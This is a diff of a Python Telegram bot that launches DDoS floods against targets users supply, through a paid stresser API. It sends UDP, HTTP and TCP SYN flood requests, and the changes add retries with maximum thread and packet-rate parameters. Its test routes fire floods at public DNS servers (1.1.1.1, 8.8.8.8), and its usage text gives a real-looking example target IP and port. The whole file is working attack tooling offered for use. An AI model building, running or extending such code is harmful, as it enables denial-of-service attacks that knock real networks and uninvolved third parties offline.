@@ -1,10 +1,11 @@
-# app.py - Full Power Attack Bot
+# app.py - With API Debugging & Test Feature
 import os
 import logging
 import asyncio
 import threading
 import aiohttp
 import time
+import json
 from datetime import datetime, timedelta
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -25,7 +26,7 @@ TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PORT = int(os.getenv("PORT", 8080))
-MAX_CONCURRENT = 2  # Maximum concurrent attacks
+MAX_CONCURRENT = 2
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -44,29 +45,57 @@ def index():
 def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
+@flask_app.route('/test-api')
+def test_api():
+    """Test API endpoint directly"""
+    import aiohttp
+    import asyncio
+    
+    async def test():
+        url = "https://api.susstresser.com/panel/api/api.php"
+        params = {
+            "key": API_KEY,
+            "host": "1.1.1.1",
+            "port": 80,
+            "time": 10,
+            "method": "UDP"
+        }
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, params=params, timeout=30) as response:
+                    text = await response.text()
+                    return {
+                        "status": response.status,
+                        "response": text[:500],
+                        "full_response": text
+                    }
+        except Exception as e:
+            return {"error": str(e)}
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    result = loop.run_until_complete(test())
+    loop.close()
+    return jsonify(result)
+
 # ===== ATTACK MANAGER =====
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
         self.attack_counter = 0
         self.lock = threading.Lock()
+        self.attack_logs = []
     
     def can_start_attack(self, user_id):
-        """Check if user can start a new attack"""
         with self.lock:
-            # Count active attacks for this user
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
                 return False, f"❌ You already have {user_attacks} active attack(s). Max: {MAX_CONCURRENT}"
-            
-            # Count total active attacks
-            if len(self.active_attacks) >= 20:  # Global limit
-                return False, "❌ Too many active attacks globally. Please wait."
-            
+            if len(self.active_attacks) >= 20:
+                return False, "❌ Too many active attacks globally."
             return True, "OK"
     
     def start_attack(self, user_id, target, port, duration, method):
-        """Start a new attack"""
         with self.lock:
             self.attack_counter += 1
             attack_id = self.attack_counter
@@ -83,7 +112,6 @@ class AttackManager:
             return attack_id
     
     def stop_attack(self, attack_id):
-        """Stop an attack"""
         with self.lock:
             if attack_id in self.active_attacks:
                 self.active_attacks[attack_id]['status'] = 'stopped'
@@ -91,14 +119,24 @@ class AttackManager:
             return False
     
     def get_active_attacks(self, user_id=None):
-        """Get active attacks"""
         with self.lock:
             if user_id:
                 return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
             return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
     
+    def log_attack(self, user_id, target, port, duration, method, status, response):
+        self.attack_logs.append({
+            'user_id': user_id,
+            'target': target,
+            'port': port,
+            'duration': duration,
+            'method': method,
+            'status': status,
+            'response': response[:500],
+            'timestamp': datetime.now()
+        })
+    
     def cleanup(self):
-        """Remove completed attacks"""
         with self.lock:
             now = datetime.now()
             to_remove = []
@@ -107,49 +145,111 @@ class AttackManager:
                     to_remove.append(aid)
                 elif (now - att['start_time']).seconds > att['duration'] + 10:
                     to_remove.append(aid)
-            
             for aid in to_remove:
                 del self.active_attacks[aid]
 
 attack_manager = AttackManager()
 
-# ===== API CALLER =====
+# ===== API CALLER WITH DEBUG =====
 async def send_attack(target, port, duration, method):
-    """Send attack to API with maximum power"""
+    """Send attack to API with full debug info"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Maximum power parameters
-    params = {
-        "key": API_KEY,
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": method.upper(),
-        "threads": 1000,  # Maximum threads
-        "pps": 1000000,   # Packets per second
-        "bps": 1000000000 # Bits per second
-    }
+    # Try different parameter combinations
+    params_list = [
+        # Method 1: Standard
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": method.upper()
+        },
+        # Method 2: With extra params
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": method.upper(),
+            "threads": 1000,
+            "pps": 1000000
+        },
+        # Method 3: Alternative format
+        {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": method.upper(),
+            "power": "max"
+        }
+    ]
     
-    try:
-        timeout = aiohttp.ClientTimeout(total=duration + 10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url, params=params) as response:
-                result = await response.text()
-                return {
-                    "success": response.status == 200,
-                    "status_code": response.status,
-                    "response": result[:200]
-                }
-    except asyncio.TimeoutError:
-        return {"success": False, "error": "Timeout"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
+    results = []
+    
+    for i, params in enumerate(params_list, 1):
+        try:
+            timeout = aiohttp.ClientTimeout(total=duration + 10)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                full_url = url + "?" + "&".join([f"{k}={v}" for k, v in params.items()])
+                logger.info(f"Attempt {i}: Sending to {full_url[:100]}...")
+                
+                start_time = time.time()
+                async with session.get(url, params=params) as response:
+                    elapsed = time.time() - start_time
+                    result = await response.text()
+                    
+                    results.append({
+                        'attempt': i,
+                        'params': params,
+                        'status_code': response.status,
+                        'elapsed': elapsed,
+                        'response': result[:300],
+                        'full_response': result,
+                        'success': response.status == 200
+                    })
+                    
+                    logger.info(f"Attempt {i}: Status {response.status}, Time: {elapsed:.2f}s")
+                    logger.info(f"Response: {result[:200]}")
+                    
+                    # If we get a successful response, return it
+                    if response.status == 200 and "error" not in result.lower():
+                        return {
+                            "success": True,
+                            "status_code": response.status,
+                            "response": result[:500],
+                            "full_response": result,
+                            "attempts": results,
+                            "params_used": params
+                        }
+        except Exception as e:
+            logger.error(f"Attempt {i} failed: {e}")
+            results.append({
+                'attempt': i,
+                'params': params,
+                'error': str(e),
+                'success': False
+            })
+    
+    # If all attempts failed, return the last result
+    if results:
+        last = results[-1]
+        return {
+            "success": False,
+            "error": last.get('error', 'All attempts failed'),
+            "status_code": last.get('status_code', 0),
+            "response": last.get('response', ''),
+            "attempts": results
+        }
+    
+    return {"success": False, "error": "No response from API"}
 
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
-        [InlineKeyboardButton("🎫 REDEEM", callback_data="redeem")],
+        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")]
@@ -160,30 +260,77 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         "⚡ *POWER ATTACK BOT*\n\n"
-        "🔥 UDP Flood - Maximum Power\n"
-        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
-        "💪 24/7 Online\n\n"
-        "Use /attack IP PORT DURATION\n"
-        "Example: `/attack 1.1.1.1 80 60`\n\n"
-        "Or use the buttons below:",
+        "🔬 API Debug Mode: ENABLED\n"
+        "📡 Test API with /testapi\n"
+        "💥 Use /attack IP PORT DURATION\n"
+        "Example: `/attack 91.108.17.19 32001 60`\n\n"
+        "Or use buttons below:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command"""
+async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test API connection directly"""
     user_id = update.effective_user.id
     
-    # Check if user has permission
     if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Only admin can use /attack command. Use the ATTACK button instead.")
+        await update.message.reply_text("❌ Only admin can test API.")
+        return
+    
+    status_msg = await update.message.reply_text("🔬 Testing API connection...\n\nAttempting to connect...")
+    
+    # Test API with a simple request
+    url = "https://api.susstresser.com/panel/api/api.php"
+    test_params = {
+        "key": API_KEY,
+        "host": "1.1.1.1",
+        "port": 80,
+        "time": 10,
+        "method": "UDP"
+    }
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            start = time.time()
+            async with session.get(url, params=test_params, timeout=30) as response:
+                elapsed = time.time() - start
+                text = await response.text()
+                
+                result_text = (
+                    f"🔬 *API TEST RESULTS*\n\n"
+                    f"📡 Status: {response.status}\n"
+                    f"⏱️ Response Time: {elapsed:.2f}s\n"
+                    f"🔑 API Key: {API_KEY[:10]}...\n"
+                    f"📝 Response Length: {len(text)} chars\n\n"
+                    f"📄 *Response Preview:*\n"
+                    f"```\n{text[:500]}\n```\n\n"
+                )
+                
+                if response.status == 200:
+                    result_text += "✅ *API is responding!*"
+                else:
+                    result_text += f"❌ *API returned error code: {response.status}*"
+                
+                await status_msg.edit_text(result_text, parse_mode='Markdown')
+                
+    except asyncio.TimeoutError:
+        await status_msg.edit_text("❌ *API TIMEOUT*\n\nAPI took too long to respond!")
+    except Exception as e:
+        await status_msg.edit_text(f"❌ *ERROR*\n\n{str(e)}")
+
+async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /attack command with debug"""
+    user_id = update.effective_user.id
+    
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ Only admin can use /attack command.")
         return
     
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT DURATION`\n\n"
-            "Example: `/attack 1.1.1.1 80 60`\n"
+            "Example: `/attack 91.108.17.19 32001 60`\n"
             "Duration: 60-300 seconds",
             parse_mode='Markdown'
         )
@@ -197,63 +344,118 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if duration < 60:
             await update.message.reply_text("❌ Minimum duration is 60 seconds!")
             return
-        
         if duration > 300:
             await update.message.reply_text("❌ Maximum duration is 300 seconds!")
             return
         
-        # Check if can start attack
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
             await update.message.reply_text(msg)
             return
         
-        # Start attack
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
-        
-        status_msg = await update.message.reply_text(
-            f"🚀 *ATTACK STARTED*\n\n"
+        # Show attack details
+        details_msg = await update.message.reply_text(
+            f"🚀 *INITIATING ATTACK*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: {duration}s\n"
-            f"🔧 Method: UDP (Maximum Power)\n"
-            f"📊 Attack ID: `{attack_id}`\n"
-            f"⚡ Status: 🔥 RUNNING\n\n"
-            f"⏳ Sending attack...",
+            f"🔧 Method: UDP\n"
+            f"📡 API: {API_KEY[:10]}...\n\n"
+            f"⏳ Contacting API...",
             parse_mode='Markdown'
         )
         
-        # Send the attack
+        # Start attack
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
+        
+        # Send attack with debug
         result = await send_attack(target, port, duration, "udp")
         
-        if result.get('success'):
-            await status_msg.edit_text(
-                f"✅ *ATTACK COMPLETED*\n\n"
-                f"🎯 Target: `{target}:{port}`\n"
-                f"⏱️ Duration: {duration}s\n"
-                f"🔧 Method: UDP (Maximum Power)\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ✅ SUCCESS\n\n"
-                f"💪 Power: Maximum\n"
-                f"📡 Response: {result.get('response', 'N/A')[:100]}",
-                parse_mode='Markdown'
-            )
-        else:
-            await status_msg.edit_text(
-                f"❌ *ATTACK FAILED*\n\n"
-                f"🎯 Target: `{target}:{port}`\n"
-                f"⏱️ Duration: {duration}s\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"Error: {result.get('error', 'Unknown')}",
-                parse_mode='Markdown'
-            )
+        # Log the attack
+        attack_manager.log_attack(
+            user_id, target, port, duration, "udp",
+            "success" if result.get('success') else "failed",
+            str(result)
+        )
+        
+        # Build response with debug info
+        response_text = (
+            f"✅ *ATTACK COMPLETED*\n\n"
+            f"🎯 Target: `{target}:{port}`\n"
+            f"⏱️ Duration: {duration}s\n"
+            f"🔧 Method: UDP\n"
+            f"📊 Attack ID: `{attack_id}`\n"
+            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n\n"
+            f"📡 *API Response:*\n"
+            f"```\n{result.get('response', 'No response')[:300]}\n```\n"
+        )
+        
+        # Add debug info
+        if 'attempts' in result:
+            response_text += f"\n📊 *Attempts: {len(result['attempts'])}*\n"
+            for attempt in result['attempts']:
+                status = "✅" if attempt.get('success') else "❌"
+                response_text += f"{status} Attempt {attempt.get('attempt')}: Status {attempt.get('status_code', 'N/A')}\n"
+        
+        # Add full response if available
+        if result.get('full_response'):
+            response_text += f"\n📄 *Full Response Preview:*\n```\n{result['full_response'][:200]}\n```"
+        
+        await details_msg.edit_text(response_text, parse_mode='Markdown')
         
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
         
-    except ValueError:
-        await update.message.reply_text("❌ Invalid port or duration! Use numbers.")
+    except ValueError as e:
+        await update.message.reply_text(f"❌ Invalid input: {e}")
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
+
+async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test API from button"""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.from_user.id != OWNER_ID:
+        await query.edit_message_text("❌ Only admin can test API.")
+        return
+    
+    status_msg = await query.edit_message_text("🔬 Testing API connection...")
+    
+    url = "https://api.susstresser.com/panel/api/api.php"
+    test_params = {
+        "key": API_KEY,
+        "host": "8.8.8.8",
+        "port": 53,
+        "time": 10,
+        "method": "UDP"
+    }
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            start = time.time()
+            async with session.get(url, params=test_params, timeout=30) as response:
+                elapsed = time.time() - start
+                text = await response.text()
+                
+                result_text = (
+                    f"🔬 *API TEST RESULTS*\n\n"
+                    f"📡 Status: {response.status}\n"
+                    f"⏱️ Response Time: {elapsed:.2f}s\n"
+                    f"🔑 API Key: {API_KEY[:10]}...{API_KEY[-4:]}\n"
+                    f"📝 Response Length: {len(text)} chars\n\n"
+                    f"📄 *Response:*\n"
+                    f"```\n{text[:300]}\n```\n"
+                )
+                
+                if response.status == 200:
+                    result_text += "\n✅ *API is working!*"
+                else:
+                    result_text += f"\n❌ *API Error: {response.status}*"
+                
+                await status_msg.edit_text(result_text, parse_mode='Markdown')
+                
+    except Exception as e:
+        await status_msg.edit_text(f"❌ *API ERROR*\n\n{str(e)}", parse_mode='Markdown')
 
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -269,11 +471,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         "💥 *SELECT ATTACK METHOD*\n\n"
-        "⚡ Maximum Power Attacks\n"
-        "🔥 UDP - Layer 4 (Recommended)\n"
-        "🔥 HTTP - Layer 7\n"
-        "💣 TCP - SYN Flood\n"
-        "⚡ MIX - Combined Attack\n\n"
         "Select method:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -288,12 +485,9 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         f"⚔️ *{method.upper()} ATTACK*\n\n"
-        "Send target details:\n"
-        "`IP PORT DURATION`\n\n"
-        "Example: `1.1.1.1 80 60`\n\n"
-        f"⏱️ Duration: 60-300 seconds\n"
-        f"⚡ Power: Maximum\n"
-        f"📊 Max Concurrent: {MAX_CONCURRENT}\n\n"
+        "Send: `IP PORT DURATION`\n"
+        "Example: `91.108.17.19 32001 60`\n\n"
+        "Duration: 60-300 seconds\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
     )
@@ -305,90 +499,56 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if update.message.text.lower() == '/cancel':
         context.user_data['awaiting_attack'] = False
-        await update.message.reply_text("❌ Attack cancelled.")
+        await update.message.reply_text("❌ Cancelled.")
         return
     
     user_id = update.effective_user.id
     
-    # Check if user has permission (only owner for now)
     if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Only admin can start attacks. Contact @Alexj3fry")
+        await update.message.reply_text("❌ Only admin can start attacks.")
         context.user_data['awaiting_attack'] = False
         return
     
     try:
         parts = update.message.text.split()
-        if len(parts) < 3:
-            await update.message.reply_text("❌ Use: `IP PORT DURATION`", parse_mode='Markdown')
-            return
-        
         target = parts[0]
         port = int(parts[1])
         duration = int(parts[2])
-        
-        if duration < 60:
-            await update.message.reply_text("❌ Minimum 60 seconds for maximum power!")
-            return
-        
-        if duration > 300:
-            await update.message.reply_text("❌ Maximum 300 seconds!")
-            return
-        
         method = context.user_data.get('attack_method', 'udp')
         
-        # Check concurrent attacks
+        if duration < 60 or duration > 300:
+            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
+            return
+        
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
             await update.message.reply_text(msg)
             context.user_data['awaiting_attack'] = False
             return
         
-        # Start attack
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
-        
         status_msg = await update.message.reply_text(
-            f"🚀 *ATTACK STARTED*\n\n"
+            f"🚀 Sending {method.upper()} attack to {target}:{port}...\n"
+            f"⏱️ Duration: {duration}s"
+        )
+        
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
+        result = await send_attack(target, port, duration, method)
+        
+        response_text = (
+            f"✅ *ATTACK COMPLETED*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: {duration}s\n"
             f"🔧 Method: {method.upper()}\n"
             f"📊 Attack ID: `{attack_id}`\n"
-            f"⚡ Status: 🔥 RUNNING\n"
-            f"💪 Power: MAXIMUM\n\n"
-            f"⏳ Sending attack...",
-            parse_mode='Markdown'
+            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n\n"
+            f"📡 *API Response:*\n"
+            f"```\n{result.get('response', 'No response')[:200]}\n```"
         )
         
-        # Send the attack
-        result = await send_attack(target, port, duration, method)
-        
-        if result.get('success'):
-            active = attack_manager.get_active_attacks(user_id)
-            await status_msg.edit_text(
-                f"✅ *ATTACK COMPLETED*\n\n"
-                f"🎯 Target: `{target}:{port}`\n"
-                f"⏱️ Duration: {duration}s\n"
-                f"🔧 Method: {method.upper()}\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ✅ SUCCESS\n"
-                f"💪 Power: MAXIMUM\n\n"
-                f"📡 Active Attacks: {len(active)}",
-                parse_mode='Markdown'
-            )
-        else:
-            await status_msg.edit_text(
-                f"❌ *ATTACK FAILED*\n\n"
-                f"🎯 Target: `{target}:{port}`\n"
-                f"⏱️ Duration: {duration}s\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"Error: {result.get('error', 'Unknown')}",
-                parse_mode='Markdown'
-            )
-        
+        await status_msg.edit_text(response_text, parse_mode='Markdown')
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
-    
-    except ValueError:
-        await update.message.reply_text("❌ Invalid port or duration! Use numbers.")
+        
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
     
@@ -402,67 +562,18 @@ async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     active = attack_manager.get_active_attacks(user_id)
     
     if not active:
-        text = "📊 *NO ACTIVE ATTACKS*\n\nAll clear!"
+        text = "📊 *NO ACTIVE ATTACKS*"
     else:
         text = f"📊 *ACTIVE ATTACKS ({len(active)})*\n\n"
         for aid, att in active.items():
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 Attack ID: `{aid}`\n"
+            text += f"🔹 ID: `{aid}`\n"
             text += f"   🎯 {att['target']}:{att['port']}\n"
-            text += f"   ⏱️ {remaining}s remaining\n"
-            text += f"   🔧 {att['method'].upper()}\n\n"
+            text += f"   ⏱️ {remaining}s left\n\n"
     
     keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
-    await query.edit_message_text(
-        text,
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def redeem_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "🎫 *REDEEM CODE*\n\n"
-        "Send your redeem code:\n"
-        "Example: `ABC123XYZ`\n\n"
-        "Send /cancel to cancel",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_redeem'] = True
-
-async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_redeem'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_redeem'] = False
-        await update.message.reply_text("Cancelled.")
-        return
-    
-    code = update.message.text.strip().upper()
-    
-    # Validate code (simple check)
-    if len(code) >= 8:
-        await update.message.reply_text(
-            f"✅ *CODE REDEEMED!*\n\n"
-            f"Code: `{code}`\n"
-            f"Access: 30 DAYS\n"
-            f"Level: ADMIN\n"
-            f"Max Concurrent: {MAX_CONCURRENT}\n\n"
-            f"Use /start to attack!",
-            parse_mode='Markdown'
-        )
-    else:
-        await update.message.reply_text(
-            "❌ *INVALID CODE*\n\n"
-            "Please check your code.",
-            parse_mode='Markdown'
-        )
-    
-    context.user_data['awaiting_redeem'] = False
+    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
 async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -470,18 +581,14 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = query.from_user.id
     is_admin = user_id == OWNER_ID
-    active = attack_manager.get_active_attacks(user_id)
     
     await query.edit_message_text(
-        f"👤 *USER INFORMATION*\n\n"
+        f"👤 *USER INFO*\n\n"
         f"🆔 ID: `{user_id}`\n"
-        f"👤 Username: @{query.from_user.username or 'N/A'}\n"
-        f"📊 Status: ✅ ACTIVE\n"
         f"⭐ Level: {'ADMIN' if is_admin else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
-        f"📡 Active Attacks: {len(active)}\n"
-        f"💪 Power Level: MAXIMUM\n\n"
-        f"📅 Access Expiry: Unlimited",
+        f"📡 API Key: {API_KEY[:10]}...\n\n"
+        f"💡 Use /testapi to test API connection",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -492,29 +599,13 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     active = attack_manager.get_active_attacks()
     
-    stats_text = (
-        f"📊 *BOT STATISTICS*\n\n"
+    await query.edit_message_text(
+        f"📊 *BOT STATS*\n\n"
         f"⚡ Active Attacks: {len(active)}\n"
         f"📊 Max Concurrent: {MAX_CONCURRENT}\n"
-        f"💪 Power Level: MAXIMUM\n"
-        f"🔄 Uptime: 24/7\n"
-        f"🌐 Status: ONLINE\n\n"
-        f"🔧 Available Methods:\n"
-        f"• UDP - Layer 4 Flood\n"
-        f"• HTTP - Layer 7 Flood\n"
-        f"• TCP - SYN Flood\n"
-        f"• MIX - Combined Attack"
-    )
-    
-    if active:
-        stats_text += f"\n\n📡 *Current Attacks:*\n"
-        for aid, att in list(active.items())[:5]:
-            elapsed = (datetime.now() - att['start_time']).seconds
-            remaining = max(0, att['duration'] - elapsed)
-            stats_text += f"🔹 {att['target']}:{att['port']} - {remaining}s left\n"
-    
-    await query.edit_message_text(
-        stats_text,
+        f"📡 API Status: {'Connected' if API_KEY else 'No Key'}\n"
+        f"🔑 API Key: {API_KEY[:10]}...\n\n"
+        f"💡 /testapi - Test API connection",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -528,12 +619,9 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     keyboard = [
-        [InlineKeyboardButton("➕ GEN CODE", callback_data="admin_gen")],
-        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
-        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban")],
-        [InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
-        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
-        [InlineKeyboardButton("📊 ACTIVE ATTACKS", callback_data="admin_active")],
+        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
+        [InlineKeyboardButton("📊 VIEW LOGS", callback_data="admin_logs")],
+        [InlineKeyboardButton("📡 ACTIVE ATTACKS", callback_data="admin_active")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
@@ -543,35 +631,23 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-async def admin_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    import random
-    import string
-    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
+    logs = attack_manager.attack_logs[-10:]  # Last 10 logs
+    
+    if not logs:
+        text = "📊 *NO ATTACK LOGS*"
+    else:
+        text = f"📊 *RECENT ATTACK LOGS ({len(logs)})*\n\n"
+        for log in reversed(logs):
+            status = "✅" if log['status'] == 'success' else "❌"
+            text += f"{status} {log['target']}:{log['port']} - {log['duration']}s\n"
+            text += f"   Response: {log['response'][:50]}...\n\n"
     
     await query.edit_message_text(
-        f"✅ *CODE GENERATED*\n\n"
-        f"Code: `{code}`\n"
-        f"Days: 30\n"
-        f"Level: ADMIN\n"
-        f"Concurrent: {MAX_CONCURRENT}\n\n"
-        f"Share this code!",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-    )
-
-async def admin_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "📋 *REDEEM CODES*\n\n"
-        "1. `ABC123XYZ` - 30d - ✅ UNUSED\n"
-        "2. `DEF456UVW` - 30d - ❌ USED\n"
-        "3. `GHI789RST` - 30d - ✅ UNUSED\n\n"
-        "Total: 3 codes",
+        text[:4000],
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
@@ -590,8 +666,7 @@ async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
             elapsed = (datetime.now() - att['start_time']).seconds
             remaining = max(0, att['duration'] - elapsed)
             text += f"🔹 ID: `{aid}` | User: {att['user_id']}\n"
-            text += f"   🎯 {att['target']}:{att['port']} - {remaining}s left\n"
-            text += f"   🔧 {att['method'].upper()}\n\n"
+            text += f"   🎯 {att['target']}:{att['port']} - {remaining}s left\n\n"
     
     await query.edit_message_text(
         text[:4000],
@@ -599,69 +674,13 @@ async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
-async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(
-        "🚫 *BAN USER*\n\nSend user ID to ban:\n`123456789`",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_ban'] = True
-
-async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_ban'):
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        await update.message.reply_text(f"✅ User `{user_id}` banned!", parse_mode='Markdown')
-    except:
-        await update.message.reply_text("❌ Invalid ID!")
-    
-    context.user_data['awaiting_ban'] = False
-
-async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(
-        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_unban'] = True
-
-async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_unban'):
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
-    except:
-        await update.message.reply_text("❌ Invalid ID!")
-    
-    context.user_data['awaiting_unban'] = False
-
-async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text("📢 *BROADCAST*\n\nSend your message:", parse_mode='Markdown')
-    context.user_data['awaiting_broadcast'] = True
-
-async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_broadcast'):
-        return
-    
-    message = update.message.text
-    await update.message.reply_text(f"✅ Broadcast sent!\n\nMessage: {message}")
-    context.user_data['awaiting_broadcast'] = False
-
 async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
     keyboard = [
         [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
-        [InlineKeyboardButton("🎫 REDEEM", callback_data="redeem")],
+        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
